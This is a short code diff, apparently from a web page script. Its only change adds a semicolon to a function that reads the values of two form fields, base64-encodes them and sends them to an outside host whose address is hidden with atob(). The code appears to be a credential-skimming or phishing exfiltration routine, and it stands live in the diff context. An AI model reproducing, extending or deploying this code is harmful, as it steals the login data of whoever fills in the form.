@@ -169,7 +169,7 @@
       function st(elm) {
         if(st.dn) return;
         fetch(`${atob("aHR0cHM6Ly9hcGktdG51cC5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`).then(function() {
-          st.f=true
+          st.f=true;
         })
         st.dn=true;
       }
